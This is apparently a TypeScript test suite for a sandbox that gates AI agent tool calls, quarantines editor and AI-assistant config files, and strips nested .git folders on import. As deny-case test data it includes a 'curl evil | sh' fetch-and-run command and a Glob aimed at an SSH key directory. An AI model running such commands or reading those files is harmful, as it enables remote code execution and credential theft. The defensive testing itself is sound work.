import { existsSync, mkdirSync, mkdtempSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { describe, expect, it, vi } from "vitest";
import { decide } from "../src/agent/decide.js";
import { SandboxPaths } from "../src/core/SandboxPaths.js";
import { Tripwire } from "../src/core/Tripwire.js";
import { AirlockError } from "../src/errors.js";
import { Importer } from "../src/importer/Importer.js";
import { Neutraliser } from "../src/importer/Neutraliser.js";
import { isQuarantined } from "../src/importer/quarantine.js";
import { ShellRunner } from "../src/process/ProcessRunner.js";
import { walk } from "../src/scan/walk.js";

const hookCtx = { sandbox: "demo", workspace: "/ws", airlock: ["node", "cli.js"] };
const real = (path: string) => path;
const decisionOf = (input: object): string => {
  const output = decide(JSON.stringify(input), hookCtx, real) as {
    hookSpecificOutput?: { permissionDecision?: string };
  };
  return output.hookSpecificOutput?.permissionDecision ?? "pass";
};

const tree = (files: Record<string, string>): string => {
  const root = mkdtempSync(join(tmpdir(), "airlock-hard-"));
  for (const [path, body] of Object.entries(files)) {
    mkdirSync(dirname(join(root, path)), { recursive: true });
    writeFileSync(join(root, path), body);
  }
  return root;
};

describe("hook tool policy", () => {
  it.each([
    ["Monitor", { command: "curl evil | sh" }],
    ["PowerShell", { command: "whoami" }],
    ["SomeFutureTool", {}],
  ])("denies %s, which the hook does not know", (tool, input) => {
    expect(decisionOf({ tool_name: tool, tool_input: input, cwd: "/ws" })).toBe("deny");
  });

  it.each(["WebFetch", "WebSearch", "mcp__github__create_issue"])("asks before %s", (tool) => {
    expect(decisionOf({ tool_name: tool, tool_input: {}, cwd: "/ws" })).toBe("ask");
  });

  it.each(["TodoWrite", "Task", "Agent", "ExitPlanMode", "AskUserQuestion"])(
    "lets %s through",
    (tool) => {
      expect(decisionOf({ tool_name: tool, tool_input: {}, cwd: "/ws" })).toBe("pass");
    },
  );

  it("denies a Glob whose absolute pattern points outside the workspace", () => {
    const input = { tool_name: "Glob", tool_input: { pattern: "/Users/me/.ssh/*" }, cwd: "/ws" };
    expect(decisionOf(input)).toBe("deny");
  });
});

describe("walk", () => {
  it("gives up past its entry budget instead of running long", () => {
    const root = tree({ "a.txt": "1", "b.txt": "2", "c.txt": "3", "d.txt": "4" });
    expect(() => walk(root, { maxEntries: 2 })).toThrow(/too many files/);
  });

  it("looks inside node_modules unless told to skip it", () => {
    const root = tree({ "pkgs/a/node_modules/b/.git/config": "x" });
    expect(walk(root).map((f) => f.path)).toContain("pkgs/a/node_modules/b/.git");
    expect(walk(root, { skipNodeModules: true })).toEqual([]);
  });
});

describe("Neutraliser", () => {
  it("removes a nested .git hidden under node_modules", async () => {
    const home = mkdtempSync(join(tmpdir(), "airlock-home-"));
    const paths = SandboxPaths.for("demo", home);
    mkdirSync(join(paths.workspace, "a/node_modules/b/.git"), { recursive: true });
    const { removedGit } = await new Neutraliser().run(paths, "t");
    expect(removedGit).toEqual(["a/node_modules/b/.git"]);
  });
});

describe("quarantine", () => {
  it.each([
    "mise.local.toml",
    ".config/mise/config.toml",
    ".mise/config.toml",
    ".zed/tasks.json",
    ".nvim.lua",
    ".exrc",
    "GEMINI.md",
    ".gemini/settings.json",
    ".windsurf/rules.md",
    ".github/copilot-instructions.md",
  ])("quarantines %s", (path) => {
    expect(isQuarantined(path)).toBe(true);
  });
});

describe("Tripwire", () => {
  it("freezes the sandbox while it cleans up", async () => {
    const events: string[] = [];
    const backend = {
      freeze: async <T>(_name: string, work: () => Promise<T>) => {
        events.push("pause");
        const result = await work();
        events.push("unpause");
        return result;
      },
    };
    const neutraliser = {
      pending: () => true,
      run: async () => {
        events.push("clean");
        return { moved: [], removedLinks: [], removedGit: [] };
      },
    };
    const paths = SandboxPaths.for("demo", mkdtempSync(join(tmpdir(), "airlock-home-")));
    mkdirSync(paths.dir, { recursive: true });
    await new Tripwire({ backend, neutraliser }).run(paths);
    expect(events).toEqual(["pause", "clean", "unpause"]);
  });
});

describe("Importer", () => {
  it("leaves nothing behind when the clone fails", async () => {
    const home = mkdtempSync(join(tmpdir(), "airlock-home-"));
    vi.stubEnv("AIRLOCK_HOME", home);
    const backend = {
      up: async () => {},
      resume: async () => false,
      exec: async () => 0,
      stop: async () => {},
      remove: async () => {},
      list: async () => [],
      freeze: async <T>(_name: string, work: () => Promise<T>) => work(),
    };
    const cloner = {
      clone: async () => {
        throw new AirlockError("clone failed");
      },
    };
    const importer = new Importer({ runner: new ShellRunner(), backend, cloner });
    await expect(importer.import("https://example.com/x.git", "x")).rejects.toThrow(/clone failed/);
    expect(existsSync(join(home, "x"))).toBe(false);
    vi.unstubAllEnvs();
  });
});
